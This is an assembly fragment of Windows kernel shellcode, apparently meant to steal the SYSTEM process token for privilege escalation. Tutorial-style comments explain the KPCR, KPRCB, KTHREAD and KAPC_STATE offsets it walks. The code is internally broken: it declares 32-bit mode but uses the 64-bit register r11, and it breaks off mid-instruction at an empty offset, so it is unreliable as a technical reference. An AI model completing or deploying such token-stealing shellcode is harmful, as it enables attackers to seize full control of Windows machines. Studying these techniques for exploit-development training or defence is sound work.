[BITS 32]

_start :
  ;the KPRC (Kernel Processor Control Region) structure. The KPCR contains per-CPU information which is shared by the kernel and the HAL (Hardware Abstraction Layer). 
  ;This stores critical information about CPU state and information. This is located at the base address of the FS segment register at index 0 in 32-bit Windows systems, 
  ;it’s [FS:0] and on 64-bit systems, it’s located in the GS segment register, [GS:0].
  ;We can see at offset 0x120 it points to ‘PrcData’ which is of type KPRCB (Kernel Processor Control Block) structure. 
  ;This structure contains information about the processor such as current running thread, next thread to run, type, model, speed, etc. Both these structures are undocumented.

  pushad ; Save processsor state 
  xor r11 , r11
  mov r11 , fs:[r11+0x124] ;  move the _KPCR.PcrbData.CurrentThread into eax
  
  ;PrcData’ _KPRCB structure we can find at offset 0x4 ‘CurrentThread’ which is of _KTHREAD (Kernel Thread) structure. This structure is embedded inside the ETHREAD structure.
  ;The ETHREAD structure is used by the Windows kernel to represent every thread in the system. This is represented by [FS:0x124].
  
  ;Next _KTHREAD.ApcState.Process is fetched into EAX. Let’s explore the _KTHREAD structure. At offset 0x40 we can find ‘ApcState’ which is of _KAPC_STATE. 
  ;The KAPC_STATE is used to save the list of APCs (Asynchronous Procedure Calls) queued to a thread when the thread attaches to another process.
  
  ;If explore further more on _KAPC_STATE structure we can find a pointer to the current process structure at offset 0x10, ‘Process’ which is of _KPROCESS structure. 
  ;The KPROCESS structure is embedded inside the EPROCESS structure and it contains scheduling related information like threads, quantum, priority and execution times. This is done in the shellcode as
  
  mov r11 , fs:[r11+0x50]
  
  ; find system process steal token 
  
  cmp dword [r11+0x]
